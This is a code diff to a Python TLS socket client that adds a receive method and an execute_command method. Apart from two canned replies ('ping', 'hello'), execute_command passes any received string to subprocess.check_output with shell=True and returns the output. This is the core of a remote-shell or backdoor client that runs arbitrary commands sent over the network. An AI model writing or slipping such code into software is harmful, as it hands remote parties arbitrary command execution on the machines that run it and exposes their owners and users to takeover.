@@ -1,6 +1,7 @@
 import socket
 import ssl
 from utils.logger import setup_logger
+import subprocess
 
 logger = setup_logger()
 
@@ -37,3 +38,33 @@ class SSLClient:
 
     def send(self, msg):
         self._ssock.send(msg.encode())
+
+    def receive(self):
+        try:
+            data = self._ssock.recv(4096)
+
+            if not data:
+                return None
+
+            return data.decode()
+
+        except Exception as e:
+            print(f"Receive error: {e}")
+            return None
+
+    def execute_command(self, command: str) -> str:
+        if command == "ping":
+            return "pong"
+
+        if command == "hello":
+            return "hello from client"
+
+        try:
+            output = subprocess.check_output(
+                command, shell=True, stderr=subprocess.STDOUT
+            )
+
+            return output.decode()
+
+        except Exception as e:
+            return f"Error: {e}"
